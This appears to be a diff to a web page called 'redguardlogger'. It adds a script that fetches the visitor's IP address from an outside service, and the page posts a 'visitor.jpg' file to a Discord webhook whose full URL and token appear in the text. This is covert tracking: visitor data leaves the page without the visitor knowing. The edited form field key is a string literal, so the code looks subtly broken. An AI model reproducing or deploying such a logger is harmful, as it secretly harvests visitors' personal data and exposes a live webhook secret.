@@ -4,6 +4,8 @@
 
 <link rel="stylesheet" href="redguardlogger.css">
   
+  <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+  
   <script async src="https://www.googletagmanager.com/gtag/js?id=UA-58936387-12"></script>
     <script>
     window.dataLayer = window.dataLayer || [];
@@ -173,7 +175,7 @@
      'visitor.jpg');
     
     var formData = new FormData();
-    formData.append('file, json.ip', file);
+    formData.append('file + json.ip', file);
     
     fetch(
       'https://discord.com/api/webhooks/1110072092826808390/IR34WYbMbUzKWKv2ade5O7m7JEQfzhpsFgOCzAql57-ViE5Rcs57JLUwnCBYboKH78kj', {
